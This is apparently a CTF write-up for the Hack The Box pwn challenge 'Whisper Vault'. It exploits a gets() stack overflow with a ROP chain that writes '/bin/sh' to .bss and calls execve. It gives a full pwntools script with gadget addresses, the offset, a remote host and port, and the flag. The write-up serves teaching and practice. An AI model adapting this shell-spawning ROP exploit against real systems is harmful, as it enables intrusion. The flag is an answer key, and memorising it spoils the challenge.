# Whisper Vault

## Challenge Description
> Beneath the shrine’s floorboards lies a small wooden vault, sealed in dust and silence.
> When opened, it reveals only a single strip of rice paper and a faint scent of incense.
> It does not ask for gold, or oaths—only a name.
> 
> Whisper one, and the vault will listen.
> But be warned: once a name is spoken here, it never truly leaves.

**Category:** Pwn
**Difficulty:** Easy

## Analysis
The binary `whisper_vault` is a 64-bit ELF executable.
`checksec` reveals:
- **Arch:** amd64-64-little
- **RELRO:** Partial RELRO
- **Stack:** No canary found
- **NX:** NX enabled
- **PIE:** No PIE (0x400000)

The `main` function calls `gets` to read input into a buffer located at `rbp-0x400` (1024 bytes). Since `gets` does not check the input length, this is a classic Buffer Overflow vulnerability.

## Exploitation
Since NX is enabled, we cannot execute shellcode on the stack. However, there is no PIE, so we can use ROP (Return Oriented Programming). The binary is statically linked (or large enough), providing plenty of gadgets.

We need to:
1.  Find the offset to the return address. The buffer is at `rbp-0x400`, so the return address is at `0x400 + 8 = 1032` bytes.
2.  Construct a ROP chain to execute `execve("/bin/sh", 0, 0)`.
3.  Since we don't have `/bin/sh` in the binary at a known location, we can write it to a writable memory area (like `.bss`) using `gets` again.

### ROP Chain Strategy
1.  **Write `/bin/sh` to memory:**
    -   `pop rdi; ret` -> `.bss` address
    -   `gets` address (to read `/bin/sh` from our second input)
2.  **Call `execve`:**
    -   `pop rdi; ret` -> `.bss` address (pointer to `/bin/sh`)
    -   `pop rsi; ret` -> 0
    -   `pop rdx; ...; ret` -> 0
    -   `pop rax; ret` -> 59 (syscall number for `execve`)
    -   `syscall`

### Exploit Script
```python
from pwn import *

# Set up the context
context.binary = binary = ELF('./whisper_vault')
context.log_level = 'debug'

# Addresses and Gadgets
gets_addr = 0x4121e0
bss_addr = 0x4c72a0
pop_rdi = 0x401f8f
pop_rsi = 0x409ffe
pop_rdx_rbx = 0x485e6b
pop_rax = 0x450107
syscall = 0x401d44

# Offset
offset = 1032

# Start the process
# p = process('./whisper_vault')
# For remote, uncomment the following line and add the host/port
p = remote('154.57.164.75', 32520)

# Construct the ROP chain
rop = b''
rop += p64(pop_rdi)
rop += p64(bss_addr)
rop += p64(gets_addr)  # Call gets(bss_addr) to write "/bin/sh"

rop += p64(pop_rdi)
rop += p64(bss_addr)   # rdi = address of "/bin/sh"
rop += p64(pop_rsi)
rop += p64(0)          # rsi = 0
rop += p64(pop_rdx_rbx)
rop += p64(0)          # rdx = 0
rop += p64(0)          # rbx = 0 (padding)
rop += p64(pop_rax)
rop += p64(59)         # rax = 59 (execve)
rop += p64(syscall)

# Construct the payload
payload = b'A' * offset + rop

# Send the payload
p.sendline(payload)

# Send the string for gets
p.sendline(b'/bin/sh\x00')

# Interactive mode
p.interactive()
```

## Flag
`HTB{0nly_s1l3nc3_kn0ws_th3_n4m3_34358c563d0ebbd82f4c5e5c15369c97}`
